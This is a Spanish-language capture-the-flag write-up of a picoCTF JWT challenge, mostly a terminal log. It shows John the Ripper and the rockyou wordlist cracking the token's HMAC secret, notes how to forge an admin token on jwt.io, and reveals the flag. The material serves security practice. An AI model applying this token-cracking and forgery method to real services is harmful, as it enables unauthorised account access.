# Objetivo
Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/58210/` or http://jupiter.challenges.picoctf.org:58210
# Solución
```
┌──(kalicura㉿rufian)-[~]
└─$ nano hash                 
                                                                                                                                                                      
┌──(kalicura㉿rufian)-[~]
└─$ cat}                                                   
zsh: parse error near `}'
                                                                                                                                                                      
┌──(kalicura㉿rufian)-[~]
└─$ cat hash      
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidG9ueSJ9._xcYgrijT_7vUwDJjXf3I2sP1w0mrKuayEAfmjeL6a8
                                                                                                                                                                      
┌──(kalicura㉿rufian)-[~]
└─$ ls /usr/share/wordlists 
amass       dirb       dnsmap.txt     fern-wifi  legion      nmap.lst     seclists    wfuzz
brutespray  dirbuster  fasttrack.txt  john.lst   metasploit  rockyou.txt  sqlmap.txt  wifite.txt
                                                                                                                                                                      
┌──(kalicura㉿rufian)-[~]
└─$ john 
Created directory: /home/kalicura/.john
John the Ripper 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 10:45:52 +0100 OMP [linux-gnu 64-bit x86_64 AVX512BW AC]
Copyright (c) 1996-2021 by Solar Designer and others
Homepage: https://www.openwall.com/john/

Usage: john [OPTIONS] [PASSWORD-FILES]

Use --help to list all available options.
                                                                                                                                                                      
┌──(kalicura㉿rufian)-[~]
└─$ john hash -w-/usr/share/wordlist/rockyou.txt
Unknown option: "-w-/usr/share/wordlist/rockyou.txt"
                                                                                                                                                                      
┌──(kalicura㉿rufian)-[~]
└─$ john hash -w=/usr/share/wordlist/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 512/512 AVX512BW 16x])
Will run 8 OpenMP threads
fopen: /usr/share/wordlist/rockyou.txt: No such file or directory
                                                                                                                                                                      
┌──(kalicura㉿rufian)-[~]
└─$ ls /usr/share/wordlists                     
amass       dirb       dnsmap.txt     fern-wifi  legion      nmap.lst     seclists    wfuzz
brutespray  dirbuster  fasttrack.txt  john.lst   metasploit  rockyou.txt  sqlmap.txt  wifite.txt
                                                                                                                                                                      
┌──(kalicura㉿rufian)-[~]
└─$ head /usr/share/wordlists/rockyou.txt 
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
                                                                                                                                                                      
┌──(kalicura㉿rufian)-[~]
└─$ john hash -w=/usr/share/wordlist/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 512/512 AVX512BW 16x])
Will run 8 OpenMP threads
fopen: /usr/share/wordlist/rockyou.txt: No such file or directory
                                                                                                                                                                      
┌──(kalicura㉿rufian)-[~]
└─$ ls                                          
Desktop  Documents  Downloads  Music  Obsidian-1.5.3.AppImage  Pictures  Public  SeguridadRedes  SeguridadRedes2  Templates  Videos  hash  ventana.c
                                                                                                                                                                      
┌──(kalicura㉿rufian)-[~]
└─$ cat hash 
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidG9ueSJ9._xcYgrijT_7vUwDJjXf3I2sP1w0mrKuayEAfmjeL6a8
                                                                                                                                                                      
┌──(kalicura㉿rufian)-[~]
└─$ john hash -wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 512/512 AVX512BW 16x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:00 DONE (2024-03-06 20:05) 1.587g/s 11754Kp/s 11754Kc/s 11754KC/s iluve.p..ilovejesus789
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                                      
┌──(kalicura㉿rufian)-[~]
└─$ 



picoCTF{jawt_was_just_what_you_thought_44c752f5}
```
# Notas
- Primero copiamos el jwt de la cookie con cookie editor, lo pegamos en un archivo y se lo pasamos a john the ripper, el cuál decifrará la palabra que codifica el jwt (ilovepico), al ingresar esta palabra en https://jwt.io/ podemos cambiar el usuario a admin para así encontrar la bandera
# Referencia